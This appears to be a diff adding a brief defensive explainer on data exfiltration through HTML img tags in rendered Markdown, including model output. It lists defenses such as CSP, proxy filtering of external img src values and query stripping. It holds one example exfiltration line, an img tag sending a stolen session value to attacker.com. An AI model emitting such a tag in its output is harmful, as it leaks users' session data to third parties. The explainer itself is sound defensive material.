@@ -1,0 +1,10 @@
+Data exfiltration via img tags — how defenders detect it
+
+Attackers sometimes include HTML like:
+`<img src="https://attacker.com/log?session=STOLEN_VALUE">` (EXAMPLE ONLY — this is how attackers exfil, not a real payload)
+
+In a Markdown renderer, this image is silently fetched when the page renders. The attacker's server logs the GET request including any query parameters. Defenses include:
+- CSP (Content Security Policy) blocking external image loads
+- Server-side rendering validation
+- LLM proxy filtering (Sieve's IN-GEN-02 pattern catches `<img` tags with external src)
+- Stripping query parameters from any external URL in model output
